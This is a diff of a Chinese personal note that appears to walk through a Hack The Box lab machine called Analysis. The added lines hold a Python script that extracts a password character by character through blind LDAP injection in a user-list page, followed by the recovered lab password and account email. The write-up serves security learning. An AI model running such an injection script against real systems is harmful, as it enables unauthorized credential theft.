@@ -1122,8 +1122,36 @@ http://internal.analysis.htb/users/list.php 提示缺少参数,使用arjun爆破
 所以这块是[[Tricks#ldap]]ldap注入...
 所以下一步是确定有哪些类
 
+---
+看了wp,是`description`这个属性里有密码,,,,
+
+手写一个脚本
+```python
+import requests
+import string
+import re
+content=''
+
+for i in range(1000):
+    for j in string.printable:
+        url=f"http://internal.analysis.htb/users/list.php?name=*)(description={content}{j}*"
+        print(url)
+        result=requests.get(url)
+        if (len(result.text)==406):
+            continue
+        else:
+            content +=j
+            break
+
+```
+
+description的内容 `97NTtl*4QP96Bv#`
+账号为邮箱, `technician@analysis.htb`
 
 http://internal.analysis.htb/employees/login.php
 ![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20240422212055.png)
 
-一个登录框,没有
+![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20240422222103.png)
+
+
+
